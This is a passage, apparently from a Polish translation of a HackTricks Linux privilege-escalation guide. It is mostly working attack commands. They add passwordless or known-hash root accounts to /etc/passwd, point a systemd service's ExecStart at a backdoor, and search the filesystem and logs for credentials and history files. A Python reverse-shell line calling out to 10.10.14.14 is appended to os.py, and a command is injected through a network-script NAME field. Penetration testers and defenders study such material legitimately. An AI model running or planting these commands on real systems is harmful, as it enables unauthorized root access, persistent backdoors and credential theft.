Np: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć poniższych linii, aby dodać użytkownika testowego bez hasła.\
UWAGA: możesz osłabić bieżące zabezpieczenia maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Uwaga: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` zostało przemianowane na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisywać do niektórych wrażliwych plików**. Na przykład — czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli na maszynie działa serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat w katalogu /etc/systemd/,** to możesz zmienić linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie wykonany następnym razem, gdy tomcat zostanie uruchomiony.

### Sprawdź katalogi

Następujące katalogi mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwna lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Pliki zmodyfikowane w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/pliki binarne w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on przeszukuje **wiele możliwych plików, które mogą zawierać hasła**.\
**Innym interesującym narzędziem**, którego możesz użyć do tego, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), która jest otwartoźródłową aplikacją służącą do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy log, tym ciekawszy (prawdopodobnie).\
Ponadto niektóre źle skonfigurowane (backdoored?) **audit logs** mogą pozwolić ci na **zapis haseł** wewnątrz audit logs, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi grupy** [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś także sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub w **zawartości**, a także sprawdzić adresy IP i e-maile w logach oraz wyrażenia regularne pasujące do hashy.\
Nie będę tu opisywać, jak to wszystko zrobić, ale jeśli jesteś zainteresowany, możesz sprawdzić ostatnie sprawdzenia wykonywane przez [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Zapisywalne pliki

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacja logrotate

Luka w `logrotate` pozwala użytkownikom z **write permissions** do pliku logu lub jego katalogów nadrzędnych potencjalnie uzyskać eskalację uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może zostać zmanipulowany do wykonania dowolnych plików, zwłaszcza w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale także w każdym katalogu, dla którego stosowana jest rotacja logów.

> [!TIP]
> Ta luka dotyczy wersji `logrotate` `3.18.0` i starszych

Bardziej szczegółowe informacje o luce znajdziesz na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę lukę za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta luka jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**, więc zawsze gdy znajdziesz możliwość modyfikacji logów, sprawdź kto nimi zarządza i czy możesz eskalować uprawnienia, zastępując logi linkami symbolicznymi.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik jest w stanie **write** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **lub** może **adjust** istniejący, to twój **system is pwned**.

Skrypty sieciowe, np. _ifcg-eth0_, są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są ~sourced~ w Linuksie przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli masz **white/blank space in the name the system tries to execute the part after the white/blank space**. To oznacza, że **everything after the first blank space is executed as root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Uwaga: spacja między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami Linux**. Zawiera skrypty do `start`, `stop`, `restart`, a czasami `reload` usług. Można je uruchamiać bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest związany z **Upstart**, nowszym systemem **zarządzania usługami** wprowadzonym przez Ubuntu, używającym plików konfiguracyjnych do zadań związanych z usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal wykorzystywane obok konfiguracji Upstart dzięki warstwie kompatybilności w Upstart.

**systemd** pojawia się jako nowoczesny init i manager usług, oferując zaawansowane funkcje takie jak uruchamianie daemonów na żądanie, zarządzanie automount oraz snapshoty stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych i `/etc/systemd/system/` dla modyfikacji administratora, upraszczając administrację systemem.

## Inne sztuczki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność kernela menedżerowi userspace. Słaba autentykacja menedżera (np. sprawdzanie sygnatury oparte na porządku FD lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod menedżera i eskalację do root na już zrootowanych urządzeniach. Więcej informacji i szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery w VMware Tools/Aria Operations może wyciągnąć ścieżkę binarki z linii poleceń procesu i uruchomić ją z -v w uprzywilejowanym kontekście. Permisywne wzorce (np. używające \S) mogą dopasować listenery przygotowane przez atakującego w zapisywalnych lokalizacjach (np. /tmp/httpd), prowadząc do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec zastosowalny do innych stacków discovery/monitoring tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
